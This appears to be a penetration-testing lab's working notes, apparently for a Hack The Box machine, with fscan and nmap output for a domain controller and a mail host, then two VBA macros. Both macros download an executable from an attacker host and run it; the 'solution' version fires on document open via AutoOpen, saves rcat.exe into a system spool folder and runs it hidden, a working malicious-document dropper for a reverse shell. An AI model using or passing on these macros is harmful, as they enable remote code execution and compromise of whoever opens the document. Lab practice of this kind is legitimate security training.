

```
10.129.238.9
10.129.238.32
10.129.238.35
```

```
[Dec 15, 2025 - 00:28:58 (+03)] exegol-HTB /workspace # ./fscan -h 10.129.238.0/24 -nobr

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 10.129.238.9    is alive
(icmp) Target 10.129.238.32   is alive
(icmp) Target 10.129.238.35   is alive
[*] Icmp alive hosts len is: 3
10.129.238.35:443 open
10.129.238.35:22 open
10.129.238.9:135 open
10.129.238.32:22 open
10.129.238.9:21 open
10.129.238.35:80 open
10.129.238.9:445 open
10.129.238.9:88 open
10.129.238.35:445 open
10.129.238.9:80 open
10.129.238.35:135 open
10.129.238.35:10001 open
10.129.238.35:10002 open
10.129.238.9:443 open
10.129.238.35:139 open
10.129.238.9:139 open
[*] alive ports len is: 16
start vulscan
[*] WebTitle http://10.129.238.35      code:404 len:315    title:Not Found
[*] NetInfo
[*]10.129.238.35
   [->]JOB2
   [->]10.129.238.35
   [->]dead:beef::3c0d:bb1e:8b68:40d2
   [->]dead:beef::105
[*] NetInfo
[*]10.129.238.9
   [->]brunodc
   [->]10.129.238.9
   [->]dead:beef::cdad:2890:880f:bfdc
[*] WebTitle https://10.129.238.35     code:404 len:315    title:Not Found
[*] WebTitle http://10.129.238.9       code:200 len:703    title:IIS Windows Server
[*] WebTitle https://10.129.238.9      code:200 len:703    title:IIS Windows Server
[+] PocScan http://10.129.238.9 poc-yaml-active-directory-certsrv-detect
[+] PocScan https://10.129.238.9 poc-yaml-active-directory-certsrv-detect
```



```
[Dec 15, 2025 - 00:28:02 (+03)] exegol-HTB /workspace # ./fscan -h 10.129.238.35 -nobr

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
10.129.238.35:22 open
10.129.238.35:10001 open
10.129.238.35:139 open
10.129.238.35:443 open
10.129.238.35:80 open
10.129.238.35:445 open
10.129.238.35:135 open
10.129.238.35:10002 open
[*] alive ports len is: 8
start vulscan
[*] WebTitle http://10.129.238.35      code:404 len:315    title:Not Found
[*] NetInfo
[*]10.129.238.35
   [->]JOB2
   [->]10.129.238.35
   [->]dead:beef::3c0d:bb1e:8b68:40d2
   [->]dead:beef::105
[*] WebTitle https://10.129.238.35     code:404 len:315    title:Not Found
```


# 10.129.238.35

```
Not shown: 986 filtered tcp ports (no-response)
PORT      STATE SERVICE              VERSION
22/tcp    open  ssh                  OpenSSH for_Windows_9.5 (protocol 2.0)
25/tcp    open  smtp                 hMailServer smtpd
| smtp-commands: JOB2, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
111/tcp   open  rpcbind
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
443/tcp   open  ssl/http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=www.job2.vl
| Subject Alternative Name: DNS:job2.vl, DNS:www.job2.vl
| Not valid before: 2023-05-09T13:31:40
|_Not valid after:  2122-05-09T13:41:37
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp   open  microsoft-ds?
1063/tcp  open  rpcbind
2049/tcp  open  rpcbind
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
| ssl-cert: Subject: commonName=JOB2
| Not valid before: 2025-10-26T11:44:40
|_Not valid after:  2026-04-27T11:44:40
|_ssl-date: 2025-12-14T22:32:55+00:00; +1h00m01s from scanner time.
10001/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
10002/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
10003/tcp open  storagecraft-image   StorageCraft Image Manager
Service Info: Host: JOB2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m00s, deviation: 0s, median: 1h00m00s
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-12-14T22:32:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.36 seconds
```


# 10.129.238.9

```python
[Dec 15, 2025 - 00:33:28 (+03)] exegol-HTB /workspace # nmap -sC -sV 10.129.238.9
Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-15 00:34 +03
Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.95% done; ETC: 00:35 (0:00:00 remaining)
Nmap scan report for 10.129.238.9
Host is up (0.065s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
| 06-29-22  01:41PM       <DIR>          malicious
|_06-29-22  04:33PM       <DIR>          queue
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-14 21:34:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-14T21:35:51+00:00; +1s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
|_Not valid after:  2121-06-29T13:33:00
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
| ssl-cert: Subject:
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
|_ssl-date: 2025-12-14T21:35:51+00:00; +1s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
|_ssl-date: 2025-12-14T21:35:51+00:00; +1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-14T21:35:51+00:00; +1s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: BRUNO
|   NetBIOS_Domain_Name: BRUNO
|   NetBIOS_Computer_Name: BRUNODC
|   DNS_Domain_Name: bruno.vl
|   DNS_Computer_Name: brunodc.bruno.vl
|   DNS_Tree_Name: bruno.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-14T21:35:11+00:00
|_ssl-date: 2025-12-14T21:35:51+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Not valid before: 2025-10-08T09:36:40
|_Not valid after:  2026-04-09T09:36:40
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-12-14T21:35:14
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.81 seconds
```



VBA Script

```
Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
    ByVal pCaller As LongPtr, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As LongPtr _
) As Long

Declare PtrSafe Function WinExec Lib "kernel32" ( _
     ByVal lpCmdLine As String, _
     ByVal nCmdShow As Long _
) As Long

Sub DownloadFile()
     Dim result As Long
     Dim filePath As String
     
     ' Use temp directory for better reliability
     filePath = Environ("TEMP") & "\payload.exe"
     
     result = URLDownloadToFileA(0, "https://<MY-IP-ADDRESS>/payload.exe", filePath, 0, 0)
     
     If result = 0 Then
         ' Download successful, execute file
         WinExec filePath, 1
     Else
         MsgBox "Download failed with error:  " & result
     End If
End Sub


```

solution:

```
Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
    ByVal pCaller As Long, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As Long) As Long

Private Declare PtrSafe Function WinExec Lib "kernel32" ( _
    ByVal lpCmdLine As String, _
    ByVal uCmdShow As Long) As Long

Sub AutoOpen()
    URLDownloadToFileA 0, "http://10.8.0.123/rcat.exe", "C:\Windows\system32\spool\drivers\color\rcat_10.8.0.123_443.exe", 0, 0
    WinExec "C:\Windows\system32\spool\drivers\color\rcat_10.8.0.123_443.exe", SHOW_HIDE
End Sub
```



